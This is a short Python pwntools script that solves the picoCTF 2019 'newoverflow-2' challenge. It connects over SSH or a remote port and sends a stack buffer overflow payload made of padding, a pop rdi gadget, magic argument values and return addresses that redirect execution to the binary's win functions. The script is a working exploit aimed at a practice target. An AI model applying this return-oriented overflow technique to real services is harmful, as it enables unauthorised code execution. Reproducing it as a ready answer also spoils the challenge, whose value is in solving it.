from pwn import *
import sys

host = '2019shell1.picoctf.com'
user = ''
password = ''
cwd = '/problems/newoverflow-2_1_bcd752d56a87efb5dfc9803b461809f7'

def exploit(s):
    main_fn = 0x4008ce

    win_fn = 0x4007be

    win_fn1 = 0x400767
    win_fn2 = 0x400781

    arg_check = 0xDEADBEEF
    arg_check1 = 0xBAADCAFE
    arg_check2 = 0xCAFEBABE
    arg_check3 = 0xABADBABE

    pop_rdi = 0x4009a3

    win1_true = 0x400777
    win2_true = 0x4007b4

    payload = b'a' * (64 + 8)
    payload += p64(pop_rdi)
    payload += p64(arg_check)
    payload += p64(win_fn1)
    payload += p64(win2_true)
    payload += b'a' * 8
    payload += p64(win_fn)

    s.sendlineafter('?', payload)
    s.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        ssh = ssh(host = host, user = user, password = password)
        #ssh.set_working_directory(cwd)
        s = ssh.process('./vuln', cwd = cwd)
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
